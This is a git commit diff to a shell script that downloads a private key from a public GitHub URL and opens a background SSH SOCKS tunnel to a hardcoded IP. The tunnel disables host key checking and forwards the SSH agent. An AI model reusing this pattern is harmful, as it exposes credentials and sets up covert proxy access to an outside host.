dd1f34fa60966a8c417ede2b0f15c5a824e5c50d
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-01 10:10:38 +0200

    Update setUpSSHTunnel.sh

--- setUpSSHTunnel.sh
+++ setUpSSHTunnel.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 wget https://raw.githubusercontent.com/chadpetersen1337/carlcovenant/main/carlcovenant.pem
 chmod 400 carlcovenant.pem
-ssh -i quintongibson61.pem -o StrictHostKeyChecking=no -f -N -A -D 9999 linux1@148.100.79.12
+ssh -i carlcovenant.pem -o StrictHostKeyChecking=no -f -N -A -D 9999 linux1@148.100.79.12
